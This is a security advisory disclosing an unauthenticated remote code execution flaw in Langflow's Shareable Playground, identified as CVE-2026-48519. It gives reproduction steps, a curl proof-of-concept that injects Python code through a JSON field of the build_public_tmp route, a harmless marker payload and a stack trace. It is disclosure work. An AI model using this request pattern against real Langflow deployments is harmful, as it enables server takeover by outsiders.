# [C] Langflow: Unauthenticated RCE in Shareable Playgrounds

## Summary
Severity: Critical
Advisory: GHSA-v5ff-9q35-q26f
CVE: CVE-2026-48519
CWE: CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-v5ff-9q35-q26f
Type: github-advisory

## Affected
- PyPI: `langflow` — affected >=0 <1.9.2

## Details
### Summary
The "Shareable Playground" (or "Public Flows" in code) contains a critical RCE vulnerability.
Simply sharing a flow exposes the deployment to RCE risk by authenticated users.

Tested on commit 2d67402b1dbaefcbce85a244d4a6cd5e4bda1cfe

### Details
Shareable Playground feature works by enabling the execution of workflows by unauthenticated users, by accessing a link.
Specifically, it enables the route `/api/v1/build_public_tmp` to execute any public flow, given a public flow ID.
When the route executes the flow, it allows for providing arbitrary custom Python code as the nodes code, inside the JSON payload!

The vulnerable field is data.nodes[X].data.node.template.code.value. See PoC for an example.

### PoC
Reproduction:
1. Create a new flow and add a Chat Input node to it
2. Share the flow ("Shareable Playground")
3. Access the public link with the browser developers tools open and execute the flow.
4. Find the `/api/v1/build_public_tmp` route and copy as cURL
5. Edit the `data.nodes[X].data.node.template.code.value` JSON field with any python code and run the cURL command.

Example PoC (replace flow ID with the correct one), and download [test_with_python.json](https://github.com/user-attachments/files/25159927/test_with_python.json):
```bash
curl 'http://localhost:7860/api/v1/build_public_tmp/<flow-id>/flow?start_component_id=ChatInput-syEJp&log_builds=false&event_delivery=streaming' \
  -H 'Content-Type: application/json' \
  -b 'client_id=anything' \
  --data-raw "$(cat test_with_python.json)"
```
Search for `touch /tmp/pwned` in the `test_with_python.json` and edit for any other code.



The stacktrace for the code executed is:
```
...
  File "/Users/ori/Work/research/langchain/langflow/src/backend/base/langflow/api/build.py", line 495, in generate_flow_events
    ids, vertices_to_run, graph = await build_graph_and_get_order()
  File "/Users/ori/Work/research/langchain/langflow/src/backend/base/langflow/api/build.py", line 234, in build_graph_and_get_order
    graph = await create_graph(fresh_session, flow_id_str, flow_name)
  File "/Users/ori/Work/research/langchain/langflow/src/backend/base/langflow/api/build.py", line 298, in create_graph
    return await build_graph_from_data(
  File "/Users/ori/Work/research/langchain/langflow/src/backend/base/langflow/api/utils/core.py", line 192, in build_graph_from_data
    graph = Graph.from_payload(payload, str_flow_id, flow_name, kwargs.get("user_id"))
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 1153, in from_payload
    graph.add_nodes_and_edges(vertices, edges)
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 270, in add_nodes_and_edges
    self.initialize()
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 512, in initialize
    self._build_graph()
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 1305, in _build_graph
    self._instantiate_components_in_vertices()
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 1347, in _instantiate_components_in_vertices
    vertex.instantiate_component(self.user_id)
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/vertex/base.py", line 382, in instantiate_component
    self.custom_component, _ = initialize.loading.instantiate_class(
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/interface/initialize/loading.py", line 45, in instantiate_class
    custom_component: CustomComponent | Component = class_object(
  File "<string>", line 59, in __init__
```

### Impact
Unauthenticated RCE on any deployment with a shareable playground.



Ori Lahav
Security Researcher @ Rubrik Inc.

## References
- https://github.com/langflow-ai/langflow/security/advisories/GHSA-v5ff-9q35-q26f
- https://nvd.nist.gov/vuln/detail/CVE-2026-48519
- https://github.com/langflow-ai/langflow
- https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2026-243.yaml
